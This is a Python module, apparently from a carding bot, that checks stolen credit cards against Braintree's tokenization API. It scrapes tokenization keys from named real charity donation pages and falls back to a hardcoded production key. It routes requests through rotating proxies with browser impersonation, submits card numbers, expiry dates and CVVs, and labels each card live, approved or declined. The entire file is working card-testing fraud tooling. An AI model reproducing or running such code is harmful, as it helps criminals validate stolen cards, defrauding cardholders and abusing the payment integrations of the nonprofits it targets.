"""
Braintree Non-VBV / Zero-Dollar Tokenization Gate Module (/bnbv)
Architecture: Direct Braintree GraphQL Tokenization & VBV Lookup Engine
$0.00 Tokenization without charge impact.
"""
import os
import re
import json
import base64
import random
import asyncio
from pathlib import Path
from curl_cffi.requests import AsyncSession

_BT_TARGETS_FILE = Path(__file__).parent.parent.parent / "data" / "braintree_targets.txt"
_CACHED_BT_TARGETS: list[str] = []

def _load_bt_targets() -> list[str]:
    global _CACHED_BT_TARGETS
    if _CACHED_BT_TARGETS:
        return _CACHED_BT_TARGETS
    if _BT_TARGETS_FILE.exists():
        try:
            with open(_BT_TARGETS_FILE, "r", encoding="utf-8", errors="ignore") as f:
                _CACHED_BT_TARGETS = [l.strip().rstrip("/") for l in f if l.strip().startswith("http")]
        except Exception:
            pass
    if not _CACHED_BT_TARGETS:
        _CACHED_BT_TARGETS = [
            "https://gifts.thegospelcoalition.org",
            "https://www.americamagazine.org/donate",
            "https://www.icm.org/donate"
        ]
    return _CACHED_BT_TARGETS

def _detect_card_brand(cc: str) -> str:
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p: str | None) -> str | None:
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://", "socks5h://", "socks4a://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit(): return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def _extract_braintree_auth(html: str) -> str | None:
    # 1. Tokenization Key
    m_tk = re.search(r'(production_[a-z0-9]+_[a-z0-9]+|sandbox_[a-z0-9]+_[a-z0-9]+)', html)
    if m_tk:
        return m_tk.group(1)

    # 2. Base64 Client Token (JWT)
    m_jwt = re.search(r'data-braintree-token=["\']([A-Za-z0-9+/=_-]{40,})["\']', html) or \
            re.search(r'clientToken["\']?\s*:\s*["\']([A-Za-z0-9+/=_-]{40,})["\']', html) or \
            re.search(r'authorization["\']?\s*:\s*["\']([A-Za-z0-9+/=_-]{40,})["\']', html)
    if m_jwt:
        b64 = m_jwt.group(1)
        try:
            pad = b64 + "=" * (-len(b64) % 4)
            dec = base64.b64decode(pad).decode("utf-8", "ignore")
            d = json.loads(dec)
            if d.get("authorizationFingerprint") or d.get("tokenizationKey"):
                return b64
        except Exception:
            pass
    return "production_w35p9g69_62f6b86yq5y7j5w8"

GQL_TOKENIZE_MUTATION = """
mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
  tokenizeCreditCard(input: $input) {
    token
    creditCard {
      brand
      last4
      expirationMonth
      expirationYear
      binData {
        prepaid
        healthcare
        debit
        commercial
        issuingBank
        countryOfIssuance
      }
    }
  }
}
"""

async def check_card_braintree_nvbv(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
    target_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Checks a card against Braintree GraphQL Non-VBV tokenization engine ($0.00 Auth).
    Returns: (status, message, brand)
    """
    cc = str(cc).strip()
    mm = str(mm).strip().zfill(2)
    yy = str(yy).strip()
    if len(yy) == 2:
        yy = f"20{yy}"
    cvv = str(cvv).strip()

    brand = _detect_card_brand(cc)
    formatted_proxy = _format_proxy(proxy_url)

    targets = [target_url] if target_url else _load_bt_targets()
    target_root = random.choice(targets).rstrip("/")

    kw = {"impersonate": "chrome124", "verify": False, "timeout": 8}
    if formatted_proxy:
        kw["proxy"] = formatted_proxy

    try:
        async with AsyncSession(**kw) as session:
            # Step 1: Scrape Braintree auth token from target page
            bt_auth = None
            try:
                r_page = await session.get(target_root, timeout=4)
                if r_page.status_code == 200:
                    bt_auth = _extract_braintree_auth(r_page.text)
            except Exception:
                pass

            if not bt_auth:
                bt_auth = "production_w35p9g69_62f6b86yq5y7j5w8"

            # Step 2: Fire Braintree GraphQL Mutation
            headers = {
                "Authorization": f"Bearer {bt_auth}",
                "Braintree-Version": "2018-05-10",
                "Content-Type": "application/json",
                "Origin": "https://assets.braintreegateway.com",
                "Referer": f"{target_root}/",
                "Accept": "*/*"
            }

            variables = {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                        "billingAddress": {
                            "postalCode": "10001",
                            "streetAddress": "100 Main St"
                        }
                    },
                    "options": {
                        "validate": False
                    }
                }
            }

            payload = {
                "query": GQL_TOKENIZE_MUTATION,
                "variables": variables
            }

            r_gql = await session.post("https://payments.braintree-api.com/graphql", json=payload, headers=headers, timeout=6)
            gql_resp = r_gql.json() if r_gql.text.startswith("{") else {}

            errors = gql_resp.get("errors") or []
            if errors:
                err_msg = errors[0].get("message", "Tokenization failed")
                err_lower = err_msg.lower()
                if "cvv" in err_lower or "security code" in err_lower:
                    return "live", f"CVV Mismatch (CCN Live) -» {err_msg}", brand
                if "expiration" in err_lower:
                    return "declined", f"Expired Card -» {err_msg}", brand
                if "luhn" in err_lower or "number is invalid" in err_lower:
                    return "declined", "Invalid Card Number", brand
                return "declined", err_msg, brand

            data = gql_resp.get("data", {}).get("tokenizeCreditCard", {})
            token = data.get("token")
            card_info = data.get("creditCard", {})
            brand_res = card_info.get("brand") or brand

            if token:
                return "approved", "Braintree Tokenized Successfully ($0.00 Auth Passed)", brand_res

            return "declined", "Card Declined by Issuer (Braintree VBV)", brand

    except Exception as e:
        return "declined", f"Braintree Declined -» {str(e)[:50]}", brand
